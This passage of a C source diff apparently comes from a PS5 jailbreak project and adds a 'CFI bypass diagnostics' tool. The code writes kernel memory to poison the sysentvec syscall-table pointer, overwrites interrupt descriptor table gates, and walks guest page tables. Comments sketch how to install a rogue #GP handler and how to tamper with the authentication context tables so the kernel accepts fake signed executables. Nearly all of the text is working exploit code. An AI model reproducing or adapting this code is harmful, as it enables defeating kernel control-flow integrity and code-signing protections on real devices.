+ *   Top 16 bits = 0xdeb7 -> non-canonical, #GP on dereference (kstuff active)
  *
- * We redirect to a REAL syscall handler, so the function type
- * matches sy_call_t perfectly. This makes the test safe even
- * if CFI IS checked -- a type-matching function won't trigger
- * CFI regardless.
- *
- * For the REAL test of whether non-matching types are checked,
- * we'd need to redirect to a gadget (different type). But that
- * risks a panic. Start with the safe version first to confirm
- * sysent writes work at all.
- * ============================================================
- */
-int probe_sysent_redirect(uint64_t sysent_addr, uint64_t sys_getpid_addr)
+ * Also show sv_size (number of syscalls) for reference.
+ * =================================================================== */
+int probe_sysentvec(void)
 {
-    if (sysent_addr == 0 || sys_getpid_addr == 0) {
-        printf("[PROBE7] Need sysent and sys_getpid addresses\n");
+    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
+    const struct fw_offsets *offsets = lookup_fw(fw);
+
+    if (!offsets) {
+        printf("[PROBE2] Unsupported firmware 0x%x\n", fw);
         return -1;
     }
 
-    /* Pick an unused syscall number (high numbers are usually free) */
-    int test_syscall = 601;
+    uint64_t svec     = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
+    uint64_t svec_ps4 = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec_ps4;
 
-    /* Read the current entry */
-    uint8_t entry[0x40];
-    uint64_t entry_addr = sysent_addr + (test_syscall * sizeof(entry));
-    kernel_copyout(entry_addr, entry, sizeof(entry));
+    printf("[PROBE2] Firmware 0x%x\n", fw);
+    printf("[PROBE2] sysentvec     @ 0x%lx (offset 0x%x)\n", svec, offsets->sysentvec);
+    printf("[PROBE2] sysentvec_ps4 @ 0x%lx (offset 0x%x)\n", svec_ps4, offsets->sysentvec_ps4);
 
-    printf("[PROBE7] Original sysent[%d]: ", test_syscall);
-    for (int i = 0; i < 16; i++) printf("%02x ", entry[i]);
+    /* Read both sysentvec structures (first 32 bytes) */
+    uint8_t buf[32];
+    for (int which = 0; which < 2; which++) {
+        uint64_t addr = which ? svec_ps4 : svec;
+        const char *label = which ? "PS4" : "PS5";
+
+        if (kernel_copyout(addr, buf, sizeof(buf)) != 0) {
+            printf("[PROBE2] Failed to read %s sysentvec\n", label);
+            continue;
+        }
+
+        int32_t sv_size;
+        uint64_t sv_table;
+        memcpy(&sv_size, buf + 0, sizeof(sv_size));
+        memcpy(&sv_table, buf + 8, sizeof(sv_table));
+
+        uint16_t top_bits = (uint16_t)(sv_table >> 48);
+
+        printf("[PROBE2] %s sysentvec:\n", label);
+        printf("[PROBE2]   sv_size    = %d syscalls\n", sv_size);
+        printf("[PROBE2]   sv_table   = 0x%lx\n", sv_table);
+        printf("[PROBE2]   top 16 bits = 0x%04x", top_bits);
+
+        if (top_bits == POISON_TAG)
+            printf(" (POISONED - kstuff ACTIVE)\n");
+        else if (top_bits == CANONICAL_TAG)
+            printf(" (canonical - kstuff paused or not loaded)\n");
+        else
+            printf(" (UNKNOWN state 0x%04x)\n", top_bits);
+
+        /* Hex dump for debugging */
+        printf("[PROBE2]   raw: ");
+        for (int j = 0; j < 24; j++)
+            printf("%02x ", buf[j]);
+        printf("\n");
+    }
+
+    return 0;
+}
+
+/* ===================================================================
+ * Probe 3: Guest page table permission survey
+ *
+ * Walk the kernel's GUEST page tables (not NPT) to understand what
+ * permissions are set. This reveals:
+ *   - .text pages: XOTEXT bit, RW status
+ *   - .data pages: RW, NX status
+ *   - DMAP pages: permissions for physical memory access
+ *
+ * NOTE: Guest PTEs are in kernel .data (writable). NPT enforcement
+ * is a separate layer we cannot inspect from the guest.
+ *
+ * The XOTEXT bit (58) is set in guest PTEs for .text pages. Even
+ * though the guest PTE allows us to clear it, the NPT still enforces
+ * execute-only, so clearing it in the guest PTE alone doesn't help.
+ * =================================================================== */
+int probe_page_permissions(uint64_t dmpml4i_addr,
+                           uint64_t dmpdpi_addr,
+                           uint64_t pml4pml4i_addr)
+{
+    if (dmpml4i_addr == 0) {
+        printf("[PROBE3] Page table symbol addresses not provided\n");
+        printf("[PROBE3] Need: DMPML4I, DMPDPI, PML4PML4I from kdlsym\n");
+        return -1;
+    }
+
+    uint32_t DMPML4I = 0, DMPDPI = 0, PML4PML4I = 0;
+    kernel_copyout(dmpml4i_addr, &DMPML4I, sizeof(DMPML4I));
+    kernel_copyout(dmpdpi_addr, &DMPDPI, sizeof(DMPDPI));
+    kernel_copyout(pml4pml4i_addr, &PML4PML4I, sizeof(PML4PML4I));
+
+    uint64_t dmap_base = ((uint64_t)DMPDPI << 30)
+                       | ((uint64_t)DMPML4I << 39)
+                       | 0xFFFF800000000000UL;
+    uint64_t pde_base  = ((uint64_t)PML4PML4I << 39)
+                       | ((uint64_t)PML4PML4I << 30)
+                       | 0xFFFF800000000000UL;
+
+    printf("[PROBE3] DMPML4I=%u DMPDPI=%u PML4PML4I=%u\n",
+           DMPML4I, DMPDPI, PML4PML4I);
+    printf("[PROBE3] DMAP base = 0x%lx\n", dmap_base);
+
+    struct {
+        const char *name;
+        uint64_t va;
+    } regions[] = {
+        { "kernel .text",   KERNEL_ADDRESS_TEXT_BASE },
+        { "kernel .text+2M", KERNEL_ADDRESS_TEXT_BASE + 0x200000 },
+        { "kernel .data",   KERNEL_ADDRESS_DATA_BASE },
+        { "kernel .data+2M", KERNEL_ADDRESS_DATA_BASE + 0x200000 },
+        { "DMAP",           dmap_base + 0x200000 },
+    };
+
+    for (int i = 0; i < 5; i++) {
+        uint64_t va = regions[i].va;
+        uint64_t pde_addr = pde_base + 8 * ((va >> 21) & 0x7FFFFFFUL);
+        uint64_t pde;
+        kernel_copyout(pde_addr, &pde, sizeof(pde));
+
+        printf("[PROBE3] %s (VA=0x%lx):\n", regions[i].name, va);
+        printf("[PROBE3]   guest PDE = 0x%lx\n", pde);
+        printf("[PROBE3]   Present=%lu RW=%lu User=%lu PS=%lu NX=%lu XOTEXT=%lu\n",
+               (pde >> 0) & 1, (pde >> 1) & 1, (pde >> 2) & 1,
+               (pde >> 7) & 1, (pde >> 63) & 1, (pde >> 58) & 1);
+
+        if ((pde >> 58) & 1)
+            printf("[PROBE3]   *** XOTEXT set - execute-only in guest PTE ***\n");
+        if (!((pde >> 1) & 1))
+            printf("[PROBE3]   *** RW=0 - read-only in guest PTE ***\n");
+        if (!((pde >> 63) & 1) && ((pde >> 0) & 1))
+            printf("[PROBE3]   *** NX=0 - executable in guest PTE ***\n");
+    }
+
+    return 0;
+}
+
+/* ===================================================================
+ * Probe 4: ctxTable / ctxStatus analysis (data-only fSELF/fPKG)
+ *
+ * The kernel's SBL authentication uses ctxTable[] and ctxStatus[] in
+ * kernel .data to track authenticated SELF contexts. By manipulating
+ * these tables, we can make the kernel accept fake/modified SELF
+ * files without patching any code.
+ *
+ * This is the "data-only HEN" approach -- it doesn't need code
+ * execution at all, just kernel data writes.
+ *
+ * ctxTable: array of authentication context structures
+ * ctxStatus: status flags for each context
+ * ctxTable_mtx: mutex protecting the table
+ * =================================================================== */
+int probe_ctx_tables(uint64_t ctxtable_addr,
+                     uint64_t ctxstatus_addr,
+                     uint64_t ctxtable_mtx_addr)
+{
+    if (ctxtable_addr == 0) {
+        printf("[PROBE4] ctxTable address not provided\n");
+        printf("[PROBE4] Need KERNEL_SYM_CTXTABLE, CTXSTATUS, CTXTABLE_MTX from kdlsym\n");
+        return -1;
+    }
+
+    printf("[PROBE4] ctxTable     @ 0x%lx\n", ctxtable_addr);
+    printf("[PROBE4] ctxStatus    @ 0x%lx\n", ctxstatus_addr);
+    printf("[PROBE4] ctxTable_mtx @ 0x%lx\n", ctxtable_mtx_addr);
+
+    /* Read the first few ctxTable entries to understand layout */
+    uint8_t ctx_entry[0x80];
+    printf("[PROBE4] First 4 ctxTable entries:\n");
+    for (int i = 0; i < 4; i++) {
+        kernel_copyout(ctxtable_addr + (i * sizeof(ctx_entry)),
+                       ctx_entry, sizeof(ctx_entry));
+
+        printf("[PROBE4]   ctx[%d]: ", i);
+        for (int j = 0; j < 32; j++)
+            printf("%02x ", ctx_entry[j]);
+        printf("...\n");
+    }
+
+    /* Read ctxStatus entries */
+    uint32_t status[4];
+    kernel_copyout(ctxstatus_addr, status, sizeof(status));
+    printf("[PROBE4] ctxStatus[0..3]: %u %u %u %u\n",
+           status[0], status[1], status[2], status[3]);
+
+    return 0;
+}
+
+/* ===================================================================
+ * Probe 5: Pointer poison test (THE ACTUAL BYPASS)
+ *
+ * This is what msg.cpp:pause_resume_kstuff() does. It writes 0xdeb7
+ * to sysentvec+14 (top 16 bits of sv_table pointer), making sv_table
+ * non-canonical. After this, every syscall triggers #GP.
+ *
+ * PREREQUISITES:
+ *   kstuff must already be loaded and have its #GP handler installed
+ *   in the IDT. If you poison sv_table WITHOUT a #GP handler ready,
+ *   the next syscall will triple-fault and crash the system.
+ *
+ * This probe:
+ *   1. Verifies kstuff is loaded (sceKernelMprotect RWX test)
+ *   2. Reads current sysentvec state
+ *   3. Poisons if not already poisoned
+ *   4. Tests a syscall through the bypass
+ *   5. Reports results
+ * =================================================================== */
+int probe_pointer_poison(void)
+{
+    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
+    const struct fw_offsets *offsets = lookup_fw(fw);
+
+    if (!offsets) {
+        printf("[PROBE5] Unsupported firmware 0x%x\n", fw);
+        return -1;
+    }
+
+    uint64_t svec     = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
+    uint64_t svec_ps4 = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec_ps4;
+
+    /* Step 1: Check if kstuff is loaded */
+    char test_buf[100] = {0};
+    int mprotect_result = sceKernelMprotect(test_buf, 100, 0x7); /* RWX */
+    if (mprotect_result != 0) {
+        printf("[PROBE5] sceKernelMprotect(RWX) failed (%d) -- kstuff NOT loaded\n",
+               mprotect_result);
+        printf("[PROBE5] CANNOT poison without kstuff #GP handler!\n");
+        printf("[PROBE5] Poisoning without a handler = instant triple fault\n");
+        return -1;
+    }
+    printf("[PROBE5] sceKernelMprotect(RWX) succeeded -- kstuff is loaded\n");
+
+    /* Step 2: Read current state */
+    uint16_t current_ps5 = 0, current_ps4 = 0;
+    kernel_copyout(svec + 14, &current_ps5, sizeof(current_ps5));
+    kernel_copyout(svec_ps4 + 14, &current_ps4, sizeof(current_ps4));
+
+    printf("[PROBE5] Current state:\n");
+    printf("[PROBE5]   PS5 sysentvec+14 = 0x%04x (%s)\n",
+           current_ps5, current_ps5 == POISON_TAG ? "POISONED" : "canonical");
+    printf("[PROBE5]   PS4 sysentvec+14 = 0x%04x (%s)\n",
+           current_ps4, current_ps4 == POISON_TAG ? "POISONED" : "canonical");
+
+    if (current_ps5 == POISON_TAG) {
+        printf("[PROBE5] Already poisoned (kstuff active). Testing syscall...\n");
+        pid_t pid = getpid();
+        printf("[PROBE5] getpid() through bypass = %d\n", pid);
+        printf("[PROBE5] Bypass is operational.\n");
+        return 0;
+    }
+
+    /* Step 3: Poison */
+    printf("[PROBE5] Poisoning sysentvec->sv_table...\n");
+    uint16_t poison = POISON_TAG;
+    kernel_copyin(&poison, svec + 14, sizeof(poison));
+    kernel_copyin(&poison, svec_ps4 + 14, sizeof(poison));
+
+    /* Step 4: Test -- if we get here without crashing, bypass works */
+    printf("[PROBE5] Poisoned. Testing syscall through #GP bypass...\n");
+    pid_t pid = getpid();
+    printf("[PROBE5] getpid() = %d -- bypass is WORKING\n", pid);
+
+    /* Step 5: Verify poison state */
+    kernel_copyout(svec + 14, &current_ps5, sizeof(current_ps5));
+    printf("[PROBE5] Verified: PS5 sysentvec+14 = 0x%04x\n", current_ps5);
+
+    return 0;
+}
+
+/* ===================================================================
+ * Probe 6: sysent table analysis (post-bypass)
+ *
+ * Once the #GP bypass is active, we can also install custom syscalls
+ * by modifying the sysent table in kernel .data. This is how kexec
+ * works on Byepervisor (sysent[0x11].sy_call = jmp [rsi] gadget).
+ *
+ * On FW >= 3.0 with kstuff, kexec is not strictly needed because
+ * kstuff handles dispatch via the #GP handler. But understanding the
+ * sysent layout is useful for diagnostics.
+ *
+ * struct sysent {
+ *     uint32_t n_arg;             // 0x00
+ *     uint32_t pad_04h;           // 0x04
+ *     uint64_t sy_call;           // 0x08 <- function pointer
+ *     uint64_t sy_auevent;        // 0x10
+ *     uint64_t sy_systrace_args;  // 0x18
+ *     uint32_t sy_entry;          // 0x20
+ *     uint32_t sy_return;         // 0x24
+ *     uint32_t sy_flags;          // 0x28
+ *     uint32_t sy_thrcnt;         // 0x2C
+ * }; // 0x30 bytes per entry
+ *
+ * NOTE: sy_call points into kernel .text. We can read the pointer
+ * value (it's stored in .data as part of the sysent table), but we
+ * CANNOT read the code at that address.
+ * =================================================================== */
+#define SYSENT_SIZE  0x30
+
+int probe_sysent(uint64_t sysent_addr)
+{
+    if (sysent_addr == 0) {
+        printf("[PROBE6] sysent address not provided\n");
+        printf("[PROBE6] Find via sysentvec->sv_table (offset +8, after unpoison)\n");
+        return -1;
+    }
+
+    printf("[PROBE6] sysent table @ 0x%lx\n", sysent_addr);
+
+    /* Read a few well-known syscalls */
+    struct {
+        int num;
+        const char *name;
+    } syscalls[] = {
+        { 0,    "nosys (indirect)" },
+        { 1,    "sys_exit" },
+        { 3,    "sys_read" },
+        { 4,    "sys_write" },
+        { 20,   "sys_getpid" },
+        { 0x11, "kexec slot" },
+    };
+
+    for (int i = 0; i < 6; i++) {
+        uint8_t entry[SYSENT_SIZE];
+        uint64_t addr = sysent_addr + syscalls[i].num * SYSENT_SIZE;
+        kernel_copyout(addr, entry, sizeof(entry));
+
+        uint32_t n_arg;
+        uint64_t sy_call;
+        memcpy(&n_arg, entry + 0, sizeof(n_arg));
+        memcpy(&sy_call, entry + 8, sizeof(sy_call));
+
+        printf("[PROBE6] sysent[%3d] %-24s: n_arg=%u sy_call=0x%lx",
+               syscalls[i].num, syscalls[i].name, n_arg, sy_call);
+
+        if (sy_call >= KERNEL_ADDRESS_TEXT_BASE && sy_call < KERNEL_ADDRESS_DATA_BASE)
+            printf(" (.text)");
+        else if (sy_call >= KERNEL_ADDRESS_DATA_BASE)
+            printf(" (.data - custom!)");
+        else if (sy_call == 0)
+            printf(" (NULL)");
+        printf("\n");
+    }
+
+    return 0;
+}
+
+/* ===================================================================
+ * Utility: Poison / unpoise sysentvec
+ *
+ * These are the primitives that msg.cpp:pause_resume_kstuff() uses.
+ * Provided here as standalone functions.
+ * =================================================================== */
+
+int cfi_bypass_enable(void)
+{
+    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
+    const struct fw_offsets *offsets = lookup_fw(fw);
+    if (!offsets) return -1;
+
+    uint64_t svec     = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
+    uint64_t svec_ps4 = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec_ps4;
+    uint16_t poison = POISON_TAG;
+
+    kernel_copyin(&poison, svec + 14, sizeof(poison));
+    kernel_copyin(&poison, svec_ps4 + 14, sizeof(poison));
+    return 0;
+}
+
+int cfi_bypass_disable(void)
+{
+    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
+    const struct fw_offsets *offsets = lookup_fw(fw);
+    if (!offsets) return -1;
+
+    uint64_t svec     = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
+    uint64_t svec_ps4 = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec_ps4;
+    uint16_t canonical = CANONICAL_TAG;
+
+    kernel_copyin(&canonical, svec + 14, sizeof(canonical));
+    kernel_copyin(&canonical, svec_ps4 + 14, sizeof(canonical));
+    return 0;
+}
+
+int cfi_bypass_is_active(void)
+{
+    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
+    const struct fw_offsets *offsets = lookup_fw(fw);
+    if (!offsets) return -1;
+
+    uint64_t svec = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
+    uint16_t val = 0;
+    kernel_copyout(svec + 14, &val, sizeof(val));
+    return val == POISON_TAG;
+}
+
+/* ===================================================================
+ * IDT #GP handler installation (sketch)
+ *
+ * This is what kstuff does internally. The steps are:
+ *
+ * 1. Allocate a region in kernel address space:
+ *    - Use a kernel data cave (KERNEL_SYM_DATA_CAVE) if available
+ *    - Or allocate via kernel malloc and fix up page permissions
+ *
+ * 2. Write the #GP handler machine code to the allocated region:
+ *    - Save all registers
+ *    - Check if RIP points to the syscall dispatch code (recognizable
+ *      pattern: the instruction that dereferences sv_table)
+ *    - If yes: fix up the non-canonical address, perform the dispatch
+ *      manually, and IRET back to the caller
+ *    - If no: chain to the original #GP handler
+ *
+ * 3. Make the region executable:
+ *    - Modify the guest PTE to clear NX
+ *    - The NPT should already allow execution on .data pages (if it
+ *      doesn't, you need to find a page that is X in NPT)
+ *
+ * 4. Read the current IDT #GP entry (vector 13):
+ *    - Save the original handler address for chaining
+ *
+ * 5. Write the new IDT #GP entry:
+ *    - Set offset_lo/mid/hi to point to our handler
+ *    - Keep the same selector and IST
+ *
+ * 6. Poison sysentvec->sv_table to activate
+ *
+ * This is a simplified description. The actual kstuff implementation
+ * handles many edge cases (NMI, double fault, IST switching, etc.).
+ *
+ * The handler code itself is architecture-specific x86-64 assembly.
+ * See ps5-kstuff by sleirsgoevy for the complete implementation.
+ * =================================================================== */
+
+/* ===================================================================
+ * IDT gate write helper
+ *
+ * Overwrites a single IDT gate entry. Use with extreme care -- a
+ * wrong handler address will triple-fault on the next interrupt.
+ * =================================================================== */
+int idt_write_gate(uint64_t idt_base, int vector, uint64_t handler,
+                   uint16_t selector, uint8_t ist, uint8_t type_attr)
+{
+    struct idt_gate gate;
+    gate.offset_lo  = (uint16_t)(handler & 0xFFFF);
+    gate.selector   = selector;
+    gate.ist        = ist & 0x7;
+    gate.type_attr  = type_attr;
+    gate.offset_mid = (uint16_t)((handler >> 16) & 0xFFFF);
+    gate.offset_hi  = (uint32_t)((handler >> 32) & 0xFFFFFFFF);
+    gate.reserved   = 0;
+
+    uint64_t gate_addr = idt_base + vector * sizeof(struct idt_gate);
+    return kernel_copyin(&gate, gate_addr, sizeof(gate));
+}
+
+/* ===================================================================
+ * Main entry point -- run all safe probes
+ * =================================================================== */
+int cfi_probe_main(uint64_t idt_base,
+                   uint64_t dmpml4i_addr,
+                   uint64_t dmpdpi_addr,
+                   uint64_t pml4pml4i_addr,
+                   uint64_t ctxtable_addr,
+                   uint64_t ctxstatus_addr,
+                   uint64_t ctxtable_mtx_addr,
+                   uint64_t sysent_addr)
+{
+    printf("============================================\n");
+    printf(" CFI BYPASS DIAGNOSTICS -- PS5 FW 4.03+\n");
+    printf("============================================\n");
+    printf("Firmware: 0x%x\n", kernel_get_fw_version());
     printf("\n");
 
-    /* Save the original sy_call for restoration */
-    uint64_t original_sy_call;
-    memcpy(&original_sy_call, &entry[8], sizeof(original_sy_call));
+    /* Probe 1: IDT inspection */
+    printf("--- Probe 1: IDT #GP Entry ---\n");
+    probe_idt_gp_entry(idt_base);
+    printf("\n");
 
-    /* Overwrite sy_call with sys_getpid's address */
-    printf("[PROBE7] Redirecting sysent[%d].sy_call to sys_getpid (0x%lx)\n",
-           test_syscall, sys_getpid_addr);
+    /* Probe 2: sysentvec state */
+    printf("--- Probe 2: sysentvec Analysis ---\n");
+    probe_sysentvec();
+    printf("\n");
 
-    kernel_copyin(&sys_getpid_addr, entry_addr + 8, sizeof(sys_getpid_addr));
+    /* Probe 3: Page permissions */
+    printf("--- Probe 3: Guest Page Table Permissions ---\n");
+    probe_page_permissions(dmpml4i_addr, dmpdpi_addr, pml4pml4i_addr);
+    printf("\n");
 
-    /* Try to invoke it */
-    printf("[PROBE7] Invoking syscall(%d)...\n", test_syscall);
-    printf("[PROBE7] If the kernel panics here, the sysent dispatch HAS CFI\n");
-    printf("[PROBE7] (but since we used a matching type, it SHOULD be safe)\n");
+    /* Probe 4: Auth context tables */
+    printf("--- Probe 4: ctxTable / ctxStatus ---\n");
+    probe_ctx_tables(ctxtable_addr, ctxstatus_addr, ctxtable_mtx_addr);
+    printf("\n");
 
-    long result = syscall(test_syscall);
-    printf("[PROBE7] syscall(%d) returned: %ld (our pid=%d)\n",
-           test_syscall, result, getpid());
+    /* Probe 5: Pointer poison test */
+    printf("--- Probe 5: Pointer Poison (CFI Bypass) ---\n");
+    probe_pointer_poison();
+    printf("\n");
 
-    if (result == getpid()) {
-        printf("[PROBE7] *** SUCCESS! Sysent redirection works! ***\n");
-        printf("[PROBE7] The sysent dispatch path accepted our redirect.\n");
-        printf("[PROBE7] Next: test with a non-matching gadget type to see\n");
-        printf("[PROBE7] if the dispatch truly lacks CFI or just matched types.\n");
-    }
+    /* Probe 6: sysent table */
+    printf("--- Probe 6: sysent Table ---\n");
+    probe_sysent(sysent_addr);
+    printf("\n");
 
-    /* Restore original */
-    kernel_copyin(&original_sy_call, entry_addr + 8, sizeof(original_sy_call));
-    printf("[PROBE7] Restored original sysent[%d]\n", test_syscall);
+    /* Summary */
+    printf("============================================\n");
+    printf(" SUMMARY\n");
+    printf("============================================\n");
+
+    int active = cfi_bypass_is_active();
+    if (active > 0)
+        printf("CFI bypass: ACTIVE (pointer poisoned, #GP dispatch)\n");
+    else if (active == 0)
+        printf("CFI bypass: INACTIVE (sysentvec canonical)\n");
+    else
+        printf("CFI bypass: UNKNOWN (unsupported firmware)\n");
+
+    printf("\nBypass mechanism: sysentvec->sv_table pointer poisoning\n");
+    printf("  Poison value: 0x%04x (non-canonical, triggers #GP)\n", POISON_TAG);
+    printf("  Restore value: 0x%04x (canonical, normal dispatch)\n", CANONICAL_TAG);
+    printf("  Target offset: sysentvec + 14 (top 16 bits of sv_table ptr)\n");
+    printf("  Handler: IDT vector 13 (#GP) -> kstuff dispatch\n");
+    printf("  CFI status: BYPASSED (hardware interrupt, not indirect call)\n");
 
     return 0;
 }
